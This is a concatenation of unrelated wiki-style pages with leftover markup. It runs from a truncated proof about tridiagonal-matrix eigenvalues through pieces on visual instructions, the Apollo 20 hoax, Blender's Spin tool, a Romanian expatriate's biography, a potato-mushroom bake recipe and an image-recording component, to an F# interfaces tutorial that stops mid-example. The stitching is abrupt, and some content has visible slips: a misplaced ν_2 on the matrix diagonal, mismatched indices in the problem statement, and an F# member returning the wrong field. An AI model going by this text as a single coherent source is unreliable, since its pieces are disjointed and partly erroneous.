implies there exists &lt;math&gt; r_{k+1,k} \in (r_{k,k},\infty) \!\,&lt;/math&gt; such that &lt;math&gt;p_{k+1}(r_{k+1,k})=0\!\,&lt;/math&gt;.


If &lt;math&gt;k+1 \!\,&lt;/math&gt; is even, then by similar reasoning

Show that for every &lt;math&gt;n = 0,1,\dots \!\,&lt;/math&gt; the roots of &lt;math&gt;p_{k+1}(x) \!\,&lt;/math&gt; are the eigenvalues of the symmetric tridiagonal matrix


:&lt;math&gt;
T =
\begin{pmatrix}
\mu_0 &amp; \nu_1 &amp;   0   &amp; \cdots &amp;   0     \\
\nu_1 &amp; \mu_1 &amp; \nu_2 &amp; \ddots &amp; \vdots  \\
   0  &amp; \nu_2 &amp; \nu_2 &amp; \ddots &amp;   0     \\
\vdots &amp; \ddots &amp; \ddots &amp; \ddots &amp; \nu_n\\
   0  &amp; \cdots &amp;   0  &amp; \nu_n  &amp; \mu_n
\end{pmatrix}
&lt;/math&gt;


|}

==Solution 3c==

Let &lt;math&gt;
T_{n+1} =
\begin{pmatrix}
\mu_0 &amp; \nu_1 &amp;   0   &amp; \cdots &amp;   0     \\
\nu_1 &amp; \mu_1 &amp; \nu_2 &amp; \ddots &amp; \vdots  \\
   0  &amp; \nu_2 &amp; \nu_2 &amp; \ddots &amp;   0     \\
\vdots &amp; \ddots &amp; \ddots &amp; \ddots &amp; \nu_n\\
   0  &amp; \cdots &amp;   0  &amp; \nu_n  &amp; \mu_n
\end{pmatrix}
&lt;/math&gt;


Then &lt;math&gt;\mbox{det}(xI_{n+1} - T_{n+1}) \!\,&lt;/math&gt; is a monic polynomial in &lt;math&gt;x \!\,&lt;/math&gt; of degree &lt;math&gt;n+1 \!\,&lt;/math&gt;.



Expanding this determinant along the last row, we have


:&lt;math&gt; \mbox{det}(xI_{n+1} - T_{n+1}) = (x-\mu_{n})\mbox{det}(xI_{n} - T_{n}) - \nu_n^2 \mbox{det}(xI_{n-1} - T_{n-1}) \qquad (1) \!\,&lt;/math&gt;


where &lt;math&gt; \mbox{det}(xI_{n} - T_{n}) \!\,&lt;/math&gt; and &lt;math&gt; \mbox{det}(xI_{n-1} - T_{n-1}) \!\,&lt;/math&gt; are monic polynomials of degree &lt;math&gt;n \!\,&lt;/math&gt; and &lt;math&gt;n-1 \!\,&lt;/math&gt;, respectively.


Notice that &lt;math&gt; \mbox{det}(xI_{1} - T_{1}) = x-\mu_0 \equiv p_1(x) \!\,&lt;/math&gt; and if we let &lt;math&gt;p_0(x) \equiv 1\!\,&lt;/math&gt;, then (1) is equivalent to the three-term recurrence stated in the problem. 


Thus, &lt;math&gt;p_{n+1}(x) \equiv \mbox{det}(xI_{n+1}-T_{n+1}) = 0 \!\,&lt;/math&gt; shows that the roots of &lt;math&gt;p_{n+1}(x) \!\,&lt;/math&gt; are the eigenvalues of &lt;math&gt;T_{n+1} \!\,&lt;/math&gt;.

== The Value of Visual Instructions ==

Visual instructions may or may not include text. Generally, it is good to have both being that there are different learning styles. However, it can often vary depending on the intended use of the instructions. Visual instructions serve to clarify a concept that is difficult to explain using only words. Graphics may be used to show how something looks, how something should look once the step has been completed, how something is done or constructed, show trends or relationships, add liveliness to the project or simply organize information. Graphics are useful since almost everyone (including children and others of a different language) can understand visual instructions. It also eliminates the cost of having to translate and print text instructions in multiple languages. Graphics are useful in instructions because people can see exactly what they need to complete.   

===&lt;u&gt;Business and Marketing:&lt;/u&gt;===
*Minimize language barriers.
*Speeds up the learning curves.
*Minimize human variability.
*Increase instruction use rate and comprehension      
*Reduce product returns.
*Decrease assembly time- increase customer satisfaction
*Ease technical support.
*Visualize and generalize data into understandable trends
*Increase integrity of reports and memos
*Promote professionalism
*Ensure universal understanding

===&lt;u&gt;Academia:&lt;/u&gt;===
*Make abstract ideas visible and concrete.
*Connect prior knowledge and new concepts.
*Provide structure for thinking, writing, discussing, analyzing, planning, and reporting.
*Focus thoughts and ideas, leading to understanding and interpretation.
*Help students to clarify thoughts, organize and analyze information, integrate new knowledge, and think critically.

==History==

Graphics have been used for communicating a message or story &lt;u&gt;long&lt;/u&gt; before written text. Graphics have a deeper impact across cultures due to their ability to create their own meaning from the picture not words. Although words may be a part of the Graphic, the images themselves produce the desired response or understanding in the intended audience. Cave paintings and maps are some of the oldest that we know of and anyone that looks upon them can see what the graphic means and what it is for. A map from today would naturally look different from one in the 18th century, but the message would still be the same. The sea routes from England to Africa or the Caribbean would consist of different names, boundaries, and possessions but the audience would still find the same meaning.

== Common Problems with Visual Instructions ==
{| style=&quot;padding:2px; text-align:left; float:right;&quot;
 | [[Image:Visualinstructions.jpeg|thumb|An example of visual instructions.]]
 |}

While there are a number of benefits of visual instructions, there are also some drawbacks. When there are no words included people may interpret graphics differently. Some graphics can be unclear, and this can confuse the intended audience if the process is very detailed and requires pieces that look identical. When the pictures include a lot of different peices it is also necessary to zoom in on difficult parts in order to see them better. Also, if each peice is not drawn to scale, then a circle could represent the top of a table or a washer. There are also certain graphics that not everyone understands. If you work in a field that employs specialized graphics, use these graphics only when communicating with readers in your field who will understand and expect them. If you are using the graphics for a wide audience (such as a board game that may be used for young children to senior citizes), make sure that the graphics you choose can be understood by all.

      <text xml:space="preserve">The '''Apollo 20 hoax''' is a story told in a series of [[wikipedia:YouTube|YouTube]] videos of a phony manned [[wikipedia:lunar mission|lunar mission]] whose purpose was to retrieve ancient [[wikipedia:Extraterrestrial life|alien]] artifacts from the [[wikipedia:moon|moon]]. Thierry Speth, a French video artist, claimed to be the perpetrator of the hoax on 9 July 2007 on Need2Know.eu, an [[wikipedia:Internet forum|internet bulletin board]].&lt;ref&gt;[http://www.need2know.eu/?p=72 Thierry Speth's admission on Need2Know]&lt;/ref&gt; However, no news organization has ever attempted to verify Speth's claim. The videos have drawn over 200,000 views since their appearance on YouTube. 

Two months after Thierry Speth's claim, another new Apollo 20 [[wikipedia:YouTube|YouTube]] video was posted by another unclaimed youtube user &quot;moonwalker1966delta&quot;.&lt;ref&gt;[http://www.youtube.com/user/moonwalker1966delta/videos New Apollo 20 video poster &amp; youtube user: moonwalker1966delta]&lt;/ref&gt;

==The hoax==
In April, 2007 a series of videos began appearing on YouTube under the username retiredafb telling the story of [[Apollo program|Apollo]] 20.&lt;ref&gt;[http://www.youtube.com/user/retiredafb The site of William Rutledge's YouTube account]&lt;/ref&gt;  Then on 23 May 2007, Italian [[wikipedia:ufology|ufologist]] Luca Scantanburlo interviewed somebody who identified himself as William Rutledge who claimed to be the commander of the Apollo 20 crew. Rutledge also claimed to be the account owner of retiredafb. However, Scantanburlo never met Rutledge in person because he conducted the interview over [[Yahoo! Messenger ]].&lt;ref&gt;[http://www.angelismarriti.it/ANGELISMARRITI-ENG/REPORTS_ARTICLES/Apollo20-InterviewWithWilliamRutledge.htm Luca Scantamburlo's interview with William Rutledge]&lt;/ref&gt;

During the interview, Rutledge claimed Apollo 20 was a top-secret mission launched in mid August of 1976 from [[Vandenberg Air Force Base]] in Santa Barbara, [[California]] and conducted jointly by the United States and the former [[Soviet Union]]. He said the other mission members were American Leona Snyder (an apparently fictitious person) and former Soviet cosmonaut [[Aleksei Leonov]], the first human being to walk in space. The purported lunar landing site of the mission was near [[Delporte crater]] on [[Far side of the Moon|the far side of the moon]]. Rutledge said the videos show that he and Leonov discovered the remains of an ancient lunar civilization.&lt;ref&gt;[http://www.youtube.com/watch?v=Y3X5oucqQe4 Apollo 20: alien spacecraft of the moon]&lt;/ref&gt;&lt;ref&gt;[http://www.youtube.com/watch?v=pXQu34KdYbg Apollo 20: alien artifacts on the moon]&lt;/ref&gt; He also said they brought back artifacts to earth for study, including a hibernating female alien.

Two months later, some unknown sources spreaded the message of a video artist Speth who claimed the responsibility for the hoax and explained that the entire story was fabricated.

==YouTube videos==
The hoaxer began posting the videos on [[April Fool's Day]], a hint that the story was nothing more than an elaborate prank. He/she has since moved most of the videos to [[Revver.com]] under the same username (retiredafb).&lt;ref&gt;[http://www.revver.com/u/retiredafb Apollo 20 videos on Revver.com]&lt;/ref&gt; However, others are scattered throughout YouTube posted by several account users, thereby making it difficult to determine the true identity of the hoaxer. Each continues to draw thousands of views. 

Despite the realistic appearance of the videos, amateurs have easily debunked them on YouTube and elsewhere on the internet.{{Fact|date=February 2009}}

The videos are short, each only lasting a couple of minutes. If viewed in their intended sequence, they tell a partial story of the mission, starting with astronauts boarding Apollo 20 and ending with the extraordinary &quot;discoveries&quot; on the moon. They include the following images:

*Ruins of an alien spacecraft
*Ruins of an alien city &lt;ref&gt;[http://www.revver.com/video/624300/apollo-20-legacy-part-1-the-city/ Ruins of an alien city]&lt;/ref&gt;
*The body of a hibernating female alien &lt;ref&gt;[http://www.revver.com/video/797241/apollo-20-ebe-mona-lisa-16-mm-film Fabricated video of a hibernating female alien]&lt;/ref&gt;
*Apollo 20 flight plans and mission patches
*The launch of Apollo 20
*William Rutledge walking on the moon &lt;ref&gt;[http://www.youtube.com/watch?v=a-A8RmnWaG0&amp;feature=related William Rutledge walking on the moon]&lt;/ref&gt;


==The truth behind the hoax==
Like many hoaxes, this story is a mixture of facts and fiction. The starting point for it are photos that [[Apollo 15]] astronauts took while in lunar orbit. The photos show what look like a cigar-shaped object resting in a crater. The hoaxer used these photos to create the image of pock-marked alien spacecraft on the moon. The NASA photos are real.&lt;ref&gt;[http://www.lpi.usra.edu/resources/apollo/frame/?AS15-P-9625 Apollo 15 photos of Delporte area]&lt;/ref&gt; However, NASA never claimed they include images of alien spacecraft. The object in question is nothing more than a natural part of the lunar terrain.

In truth, Apollo 20 was a mission that never got off the ground -- literally. It was one of three lunar missions NASA cancelled due to lack of funding along with Apollos 18 and 19. The last NASA lunar mission was [[Apollo 17]], launched in 1972. The next Apollo mission was the [[Apollo-Soyuz Test Project]] coordinated by the United States and the former Soviet Union in 1975. However, its mission was to remain in low earth orbit and to dock with a [[Soviet]] [[Soyuz (spacecraft)|Soyuz spacecraft]], something it accomplished successfully. Some mistakenly refer to that mission as Apollo 18. 

Some of the [[Multistage rocket|stages]] for the [[Saturn V]] rockets intended for NASA’s three cancelled lunar missions had already been constructed before their cancellation. According to the hoaxer's story, these were all used on lunar missions for Apollos 18, 19 and 20. In reality NASA used one of these to launch [[Skylab]] into orbit in 1973. The others are on display at three American space centers: the [[John F. Kennedy Space Center]] near Cape Canaveral, Florida; the [[Johnson Space Center]] in Houston, Texas and the [[United States Space &amp; Rocket Center]] in Huntsville, Alabama.

==How the Spin Tool Works==
The Spin tool works by making copies of the selected vertices in a radial array around an axis indicated by the 3d cursor. Each copies of vertices are connected to previous vertices that corresponds to it with necessary geometry, i.e. edges and planes.

A picture explains this more clearly.

[[Image:BeforeSpining.png|thumb|center|603px|Selected vertices before using the Spin tool]]

[[Image:AfterSpinning.png|thumb|center|562px|Result after using the Spin tool]]

Note that the copied vertices are arranged in a radial array around our 3d cursor and parallel to our view plane.

==Typical Work Flow==
1) Make half of the outline of our object with connected vertices. If you want to model a wineglass, make the half of the outline of the wineglass.

2) Spin our outline. After this the Spin tool would complete our object.

3) Clean up the resulting mesh. The mesh created by the Spin tool is not so perfect so we had to &quot;clean&quot; it up.

====Modeling Half of the Outline====
To start we make half of the outline. Here we do it by creating vertices.

Open Blender. Don't remove the default cube cause we are going to use it. If you don't have any object after you open Blender (like mine), add a mesh object. Any of them will do. I tend to use the plane. At this time it is good to give your object a proper name. Name it sensibly, like &quot;wineglass&quot; if we are modeling a wineglass. This will help us locate it if there comes a time when we have a lot of objects in our scene. We don't want to have all objects to be called cube.001, sphere.003 or something. That could get confusing.

Hit Tab key to enter Edit Mode, if we are not in there yet. Select all vertices by hitting AKey, then delete them with XKey -&gt; Vertices. Then go to the front view be hitting Num1.

Now, we are going to make the outline by creating vertices. Press and hold CtrlKey then click the left mouse button. A new vertex would be created. Click the left mouse button again, another vertici would be created but this time it is connected to the previous vertici by an edge. Click again to add more vertices. We are going to use this to create our outline.

You might notice that the 3d manipulator (red, green and blue arrows) could get in the way. Deactivate it by hitting Ctrl+Space Bar, then select Enable/Disable, or by clicking the white pointing hand icon in the 3d view window.

Lets start making the outline. Delete our previously created vertices first. Using what we have learned, lets create vertices again but this time lets add them to form some sort of outline. let us be creative here. It could be anything you want. Here I make two to illustrate two situations that we might encounter when modeling with the Spin tool. That is modeling objects that are hollow or non hollow.

[[Image:HalfOutlineDrinkingGlass.jpg|thumb|center|315px|Half outline of a drinking glass]]

Here, the first one, is an outline of a glass. Here, we are modeling an object that is not hollow. We had two vertices that are located in the center of our would be glass bottom. We need to align the two central vertices perfectly along the z axis. Select this two vertices then scale it along the x axis to zero (SKey, xKey, 0Key, Enter). 

[[Image:HalfOutlineNapkinRing.jpg|thumb|center|341px|Half outline of a napkin ring]]

The second one I will make into a napkin ring. This time our outline is closed and no vertices are located in the center of our would be napkin ring. Here we are modeling an object that is hollow.

To make the closed outline, select the two vertices on the open side then press FKey. The two vertices would be bridged by an edge, thus closing the outline.

Adjust vertices when necessary.

For those who may like to have an image in the background to guide them. Upload a background image by selecting the View menu from the 3d View Window then select &quot;Background Image&quot;. A new internal window would appear. Click &quot;Use Background Image&quot; Button, then click &quot;Load&quot;. Navigate to where the Image is located select it then click &quot;SELECT IMAGE&quot;. Our image would appear on the 3d Window as a background. Bellow, I used a picture of a wineglass.

====Spinning Our Outline====

Now that the outline is finished, we are ready to use it with the Spin tool

Two things you must know is that the Spin tool is dependent on the location of the 3d cursor, and view where we activate our Spin tool.

[[Image:OriginalOutlineInBlender.jpg|thumb|center|362px|Setup with an arbitrary shape]]

Here is our setup with the vertices all selected. In the nest pictures are results when this shape is spun with the 3d cursor at different locations.

[[Image:OutlineSpunInBlender1.jpg|thumb|center|362px|Shape spun with 3d cursor at the origin]]

[[Image:OutlineSpunInBlender2.jpg|thumb|center|362px|Shape spun with 3d cursor at another location]]

Here we have the same shape but is spun around in different views.

[[Image:ShapeInTopView.jpg|thumb|362px|center|Shape seen in top view]][[Image:OutlineSpunInBlender3.jpg|thumb|center|362px|Shape spun in top view]]

[[Image:ShapeInArbitraryView.jpg|thumb|362px|center|Shape seen in an arbitrary view]][[Image:OutlineSpunInBlender4.jpg|thumb|center|362px|Shape spun in an arbitrary view]]

Note that its important only to place the 3d cursor properly relative to the view where you are going to use the Spin tool

======Placing Our 3d Cursor======

We can see that the location of our 3d cursor is very important in Spin modeling so we need to know how to place it properly. If you prepare it to be, the cursor would already be in position after we make our outline but accidents happen and we accidentally misplaced our 3d cursor. Here are some ways we could make our 3d cursor go to the place where we want it to be.

======Snapping======

Snapping the 3D cursor is a quick and simple way to place our 3d cursor to its proper location. In the 3d window, hit Shift + SKey. A list of options would appear. We are interested with the last three options, namely the cursor snaps options. They are the Cursor-&gt;Selection, Cursor-&gt;Grid and Cursor-&gt;Active. The name are pretty descriptive but we'll give a short description here.

Cursor-&gt;Selection places the cursor to the exact location of our selected element or elements. In case of multiple selected elements, our cursor is placed on the median of the selected elements. In edit mode, select a vertex and use Cursor-&gt;Selection snap to it. Our 3d cursor would jump to the exact place where our selected vertex is located.

Cursor-&gt;Selection snapping is especially useful when modeling non hollow objects because there are vertex or vertices located at the center of our model to snap to. Just select one central vertex and snap to it.

[[Image:CursorSelectionSnapDemo_Before.jpg‎ |thumb|center|298px|Here our 3d cursor is not at the center of our drinking glass outline. We select one of the central vertex and do Cursor-&gt;Selection snapping.]]

[[Image:CursorSelectionSnapDemoAfter.jpg‎|thumb|center|293px|Result after doing the Cursor-&gt;Selection snap.]]


Cursor-&gt;Grid snaps the cursor to the nearest cross of the visible grid. Try clicking at a center of a square in our Blender's grid and use it. See its effect.

Cursor-&gt;Grid snapping is useful for spin modeling hollow models. Usually if you are careful, our object outline would be on a plane that contains one of the axises.  If we make our outline in front view as advised, go to the top view (or side view depending on what we are modeling). If you are doing okay, you will see all our vertices aligned perfectly along the x axis. It just a matter of LMB close to a cross on the grid that contains our objects center then snap to it.

Cursor-&gt;Active might not be so helpful in spin modeling. Cursor-&gt;Active snaps the cursor to the active element (usually the element that is last to be selected). Try it by selecting several vertices, then do Cursor-&gt;Active snap. The vertex where the 3d cursor goes is the active element in your selection.

======Spin Tool Parameters======

The spin accepts two parameters to execute its function. These are Degrees (degr) and Steps.

[[image:BlenderDegr.jpg]]

'''Degrees''' specifies the angle at which the selected geometry will be rotated from its initial position around the axis. It accepts values in degrees. A 360 degrees value being a whole turn around the axis. Values lesser than 360 produces something like a wedge is sliced from the side of the form.

{{Noframecenter|1=[[Image:BlenderSpintoolIntroDegrParameter360degrees.jpg|554px]]|2=Sample Outline Spun with Degress parameter set at 360 degrees}}

[[image:BlenderSteps.jpg|none]]

'''Steps''' specifies the number of &quot;copies&quot; of the selected geometry the spin tool makes that it arranges in a radial array around the 3d cursor. A higher value result in much rounder form.

{{Noframecenter|1=[[Image:BlenderSpintoolIntroStepsParameter4Steps.jpg|554px]]|2=Sample Outline Spun with Steps parameter set at 4 steps}}

{{Noframecenter|1=[[Image:BlenderSpintoolIntroStepsParameter32Steps.jpg|554px]]|2=Sample Outline Spun with Steps parameter set at 32 steps}}

====Cleaning Up the resulting Mesh====
After using the spin tool, a little up work might be necessary, especially if you specified a 360 degree turn. Though the mesh looks clean to the eye, the tool actually make geometries (vertices) that are in the same blender position as another one. So what might look like one vertex may actually be two. A simple way to clean up our mesh would be to select the whole geometry then activating the &quot;remove doubles&quot; from the specials menu ( Wkey(Specials Menu) -&gt; remove doubles or Wkey-&gt;6key). This would remove these problem geometries, finds vertices that are too close to each other and merging them to one.

==Post Modeling==
After the lathe able parts are done it would be ready to adding non latheable parts. For example a cup may have a bowl-like body, that we could use the spintool. Alas the handle can't be so we had to put it there after. Depending on the geometry added. This geometries could be formed from the mesh itself or be adding in a separate mesh.

The founder, Kent T Carter of SC American Connections SRL, named the organization after his fathers ranch (MonkeyWrench Ranch) back in Oregon, in memory of his father. In 2001, a fire took everything but the land itself from Mr. Carter, and with newly imposed government retrictions, was not allowed to rebuild a home on the land. Without ability to live there, Mr. carter made the decision to leave the gestapo tactics of the small town goverment in his home towm area, and venture forth into the world to find a new begining. He now resides in Bucharest ROMANIA where he discovered the love for creating Video Game Assets.</text>

      <text xml:space="preserve">East Oregonian Newpaper 2005 Not many people get to start over at 50, but Kent Carter has. Carter was born on a cattle ranch in Eastern Oregon in the spring of 1954. The circumstances of his parent’s union offered a premonition of the tumultuous times ahead for their son. His father, Ted Carter, came from cattle people. His mother, Verna Ward, came from sheep people. They married while the “range wars” over the use of land for cattle or sheep were raging, and both their families opposed the marriage. His country upbringing included working on the ranch and attending the Grant County Fair and the Pendleton Round-Up. His parents separated when he was 11, and his independent streak intensified. He points to his lineage for an excuse for his wanderlust. He claims to be part Nez Perce, Irish, Cherokee, and Scottish, topped off with Aries (Berbec in Romanian). He went to college in Eugene but didn’t last long. “I wasted it all on parties and feeling bad about what I did with my father’s college fund,” he says. He joined the Navy with an eye on the G.I. Bill, allowing him to travel widely. “The closest I came to Eastern Europe was in Greece,” he recalls. The region was mired in the Cold War at the time. After serving in the Navy, he married but eventually joined the Army when he couldn’t find a job. All told, he spent 17 years in the military. He lived in Montana, then Wyoming, and obtained two associates degrees. When his father died in 1990, he moved back to the ranch where he grew up near Long Creek — a logging and ranching town of 230 an hour south of Ukiah. It became increasingly difficult to make the ranch profitable, so he worked as watermaster and maintenance supervisor for Long Creek for more than four years, but that segment of his life ended in disaster and recriminations. He was suspended from his job in the spring of 2001. About two weeks later, his rural Long Creek home burned to the ground in an unexplained fire the volunteer fire department didn’t respond to until it was much too late to help. The next day, he was fired by the City Council. The city offered no public explanation at the time, and Carter declines to talk about it other than to attribute the episode to “small-town politics.” But he acknowledges it was the beginning of the end of his life as he knew it. Getting back on his feet after losing his home and job proved nearly impossible. He says he was unable to cut through the red tape to gain approval to rebuild his home. He lived in a small trailer on the site without electricity, running a computer with a gas generator. His relationship of eight years gradually crumbled under the strain, compounded by legal problems from driving violations. “Also, every time I went out the door, I had to look at this site (of the fire) and this kept all the pain of my loses very prominent in my mind,” he admits The computer ended up being his ticket out. As he worked to establish some on-line businesses, he began chatting with people from around the world, particularly in Russia and Romania. With his life in the United States floundering, Carter made the bold decision to visit Romania and a women he’d met there through the Internet. He contracted with a man to provide hunting rights on his land, leased some land not used for pasture and agreed to sell his cattle to raise money to head to Romania to meet the woman “I had communicated with for several months by Internet, letters and telephone.” Once again, life threw him for a loop. The woman had a boyfriend and “had lied to me about many things; but she did help me get established here.” He’s still struggling to find his niche in Bucharest, after working several short-term jobs and suffering the failure of a food store venture when his associate left town. “To this date, I have lived in seven different locations within Bucharest and know very well how to get around the center of the city,” he says, noting with a laugh that people often ask him for directions. He’s had to sell his ranch near Long Creek, but life is looking up in Romania. He used the money to register his business, American Connections, which he bills as “connecting the world to modern Romania.” He offers to help outsiders with real estate, communications, advertising, touring, investment or development in the country of 23 million (reached at americanconnectionsromania.com). He’s finally secured a permanent visa and hopes to eventually return to northeast Oregon to visit his mother and reclaim his 1958 Harley Davidson motorcycle, “one of the few things I saved from the fire that I really value.” He’s also met “a wonderful woman ... We have now been together for over a year, and I hope to marry and make a family with her.” The language continues to be a challenge, and Carter still misses the land where he grew up. But he has no regrets starting over in Romania. Many people from his old life and his new one have asked why he made such a drastic change. “The only answer I can give anyone is that I came here to go beyond the pain in my heart from my loses from the past, start a new life, and to be free.” ——— Hal McCune is a senior reporter and columnist with the East Oregonian.</text>

{{recipe}}

==Ingredients==
* 4 pieces of potatoes
* 200 gr/ 8 oz / 0.4 pound mushroom
* Olive oil
* 1 pack of cream- 200 ml/ 1 cup
* 200 gr / 8 oz / 0.4 pound fresh white cheese or hellim or mozzarella or dried curd cheese, actually any cheese
* Salt, black pepper, red pepper
* White bread grates or bread crumbs

==Procedure==
# Boil the potatoes slightly. Slice them or mash them. Mix it with salt and black pepper.
# Sauté the mushroom in oil slightly. I used butter because I thought it would taste better with the potatoes.
# Oil the glass pot slightly. Lay the half of the potatoes as a base and lay the mushrooms over them. Add half of the cream and spices over them. Drizzle some dry bread and cheese over them. Lay the remaining potatoes over and pour the remaining cream over all. Drizzle some more dry bread grates.
# Leave it in the oven for 20 minutes. Add some more cheese on it put it back to oven again.

== Description ==

This component allows to record the image by saving each frame to a
separate image file. These images can be used by other programs, or,
for example they can be converted into a video with mplayer.

Beware that the place where this component is used has a big influence
on the result, as it use the images that are processed. For example,
showing the black and white image after the blob selection will show
only the selected blobs. As a rule of thumb, the display will
corresponds to what is displayed in the last previous component
displaying the wanted image.

== Input ==
The gray, the color or the binary image.

== Output ==

The images as separate files.

== Parameters ==

=== Prefix ===

The filename prefix to use. Frame number and file extension will be
added automatically.

The frame number will be zero-padded to 8 chars, so that alphabetical
order of the filenames will correspond to the numerical order of the
frames.

If the prefix contains directories (for example, it is 'frames/frame') those directories will be created as needed.

=== File type ===

Note that png format is quite slow. bmp is very fast, but the resulting files  are pretty big.</text>

{{fsharpTitle|Interfaces}}

An object's '''interface''' refers to all of the public members and functions that a function exposes to consumers of the object. For example, take the following:

&lt;source lang=&quot;ocaml&quot;&gt;
type Monkey(name : string, birthday : DateTime) =
    let mutable _birthday = birthday
    let mutable _lastEaten = DateTime.Now
    let mutable _foodsEaten = [] : string list
    
    member this.Speak() = printfn &quot;Ook ook!&quot;
    member this.Name = name
    member this.Birthday
        with get() = _birthday
        and set(value) = _birthday &lt;- value
        
    member internal this.UpdateFoodsEaten(food) = _foodsEaten &lt;- food :: _foodsEaten
    member internal this.ResetLastEaten() = _lastEaten &lt;- DateTime.Now
    member this.IsHungry = (DateTime.Now - _lastEaten).TotalSeconds &gt;= 5.0
    member this.GetFoodsEaten() = _lastEaten
    member this.Feed(food) =
        this.UpdateFoodsEaten(food)
        this.ResetLastEaten()
        this.Speak()
&lt;/source&gt;

This class contains several public, private, and internal members. However, consumers of this class can only access the public members; when a consumer uses this class, they see the following interface:
&lt;source lang=&quot;ocaml&quot;&gt;
type Monkey =
  class
    new : name:string * birthday:DateTime -&gt; Monkey
    member Feed : food:string -&gt; unit
    member GetFoodsEaten : unit -&gt; DateTime
    member Speak : unit -&gt; unit
    member Birthday : DateTime
    member IsHungry : bool
    member Name : string
    member Birthday : DateTime with set
  end
&lt;/source&gt;

Notice the &lt;code&gt;_birthday&lt;/code&gt;, &lt;code&gt;_lastEaten&lt;/code&gt;, &lt;code&gt;_foodsEaten&lt;/code&gt;, &lt;code&gt;UpdateFoodsEaten&lt;/code&gt;, and &lt;code&gt;ResetLastEaten&lt;/code&gt; members are inaccessible to the outside world, so they are not part of this object's public interface.

All interfaces you've seen so far have been intrinsically tied to a specific object. However, F# and many other OO languages allow users to define interfaces as stand-alone types, allowing us to effectively ''separate an object's interface from its implementation''.

== Defining Interfaces ==
According to the [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785736 F# specification], interfaces are defined with the following syntax:

&lt;source lang=&quot;ocaml&quot;&gt;
type type-name = 
   interface
       inherits-decl 
       member-defns 
   end
&lt;/source&gt;

: '''Note:''' The interface/end tokens can be omitted when using the #light syntax option, in which case Type Kind Inference ([http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785727 §10.1]) is used to determine the kind of the type. The presence of any non-abstract members or constructors means a type is not an interface type.

For example:
&lt;source lang=&quot;ocaml&quot;&gt;
type ILifeForm = (* .NET convention recommends the prefix 'I' on all interfaces *)
    abstract Name : string
    abstract Speak : unit -&gt; unit
    abstract Eat : unit -&gt; unit
&lt;/source&gt;


== Using Interfaces ==
Since they only define a set of public method signatures, users need to create an object to ''implement'' the interface. Here are three classes which implement the ILifeForm interface in fsi:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; type ILifeForm =
    abstract Name : string
    abstract Speak : unit -&gt; unit
    abstract Eat : unit -&gt; unit
    
type Dog(name : string, age : int) =
    member this.Age = age

    interface ILifeForm with
        member this.Name = name
        member this.Speak() = printfn &quot;Woof!&quot;
        member this.Eat() = printfn &quot;Yum, doggy biscuits!&quot;
        
type Monkey(weight : float) =
    let mutable _weight = weight
    
    member this.Weight
        with get() = _weight
        and set(value) = _weight &lt;- value
        
    interface ILifeForm with
        member this.Name = &quot;Monkey!!!&quot;
        member this.Speak() = printfn &quot;Ook ook&quot;
        member this.Eat() = printfn &quot;Bananas!&quot;
        
type Ninja() = 
    interface ILifeForm with
        member this.Name = &quot;Ninjas have no name&quot;
        member this.Speak() = printfn &quot;Ninjas are silent, deadly killers&quot;
        member this.Eat() =
            printfn &quot;Ninjas don't eat, they wail on guitars because they're totally sweet&quot;;;

type ILifeForm =
  interface
    abstract member Eat : unit -&gt; unit
    abstract member Speak : unit -&gt; unit
    abstract member Name : string
  end
type Dog =
  class
    interface ILifeForm
    new : name:string * age:int -&gt; Dog
    member Age : int
  end
type Monkey =
  class
    interface ILifeForm
    new : weight:float -&gt; Monkey
    member Weight : float
    member Weight : float with set
  end
type Ninja =
  class
    interface ILifeForm
    new : unit -&gt; Ninja
  end
&lt;/source&gt;

Typically, we call an interface an ''abstraction'', and any class which implements the interface as a ''concrete implementation''. In the example above, &lt;code&gt;ILifeForm&lt;/code&gt; is an abstraction, whereas &lt;code&gt;Dog&lt;/code&gt;, &lt;code&gt;Monkey&lt;/code&gt;, and &lt;code&gt;Ninja&lt;/code&gt; are concrete implementations.

Its worth noting that interfaces only define instance members signatures on objects. In other words, they cannot define static member signatures or constructor signatures.

=== What are interfaces used for?''' ===

Interfaces are a mystery to newbie programmers (after all, what's the point of creating a type with no implementation?), however they are essential to many object-oriented programming techniques. Interfaces allow programmers to generalize functions to all classes which implement a particular interface, even if those classes don't necessarily descend from one another. For example, using the &lt;code&gt;Dog&lt;/code&gt;, &lt;code&gt;Monkey&lt;/code&gt;, and &lt;code&gt;Ninja&lt;/code&gt; classes defined above, we can write a method to operate on all of them, as well as any other classes which implement the ILifeForm interface.

=== Implementing Interfaces with Object Expressions ===
Interfaces are extremely useful for sharing snippets of implementation logic between other classes, however it can be very cumbersome to define and implement a new class for ad hoc interfaces. Object expressions allow users to implement interfaces on anonymous classes using the [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785612 following syntax]:

&lt;source lang=&quot;ocaml&quot;&gt;
{ new ty0 [ args-expr ] [ as base-ident ] [ with 
      val-or-member-defns end ]
 
  interface ty1 with [ 
      val-or-member-defns1 
   end ]
 
  …

  interface tyn with [ 
      val-or-member-defnsn  
  end ] }
&lt;/source&gt;

Using a concrete example, the .NET BCL has a method called &lt;code&gt;[http://msdn.microsoft.com/en-us/library/bzw8611x.aspx System.Array.Sort&lt;T&gt;(T array, IComparer&lt;T&gt;)]&lt;/code&gt;, where &lt;code&gt;[http://msdn.microsoft.com/en-us/library/6zzyats9.aspx IComparer&lt;T&gt;]&lt;/code&gt; exposes a single method called &lt;code&gt;Compare&lt;/code&gt;. Let's say we wanted to sort an array on an ad hoc basis using this method; rather than litter our code with one-time use classes, we can use object expressions to define anonymous classes on the fly:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; open System
open System.Collections.Generic

type person = { name : string; age : int }

let people =
    [| { name = &quot;Larry&quot;; age = 20 };
      { name = &quot;Moe&quot;; age = 30 };
      { name = &quot;Curly&quot;; age = 25 } |]
      
let sortAndPrint msg items (comparer : System.Collections.Generic.IComparer&lt;person&gt;) =
    Array.Sort(items, comparer)
    printf &quot;%s: &quot; msg
    Seq.iter (fun x -&gt; printf &quot;(%s, %i) &quot; x.name x.age) items
    printfn &quot;&quot;

(* sorting by age *)    
sortAndPrint &quot;age&quot; people { new IComparer&lt;person&gt; with member this.Compare(x, y) = x.age.CompareTo(y.age) }

(* sorting by name *)
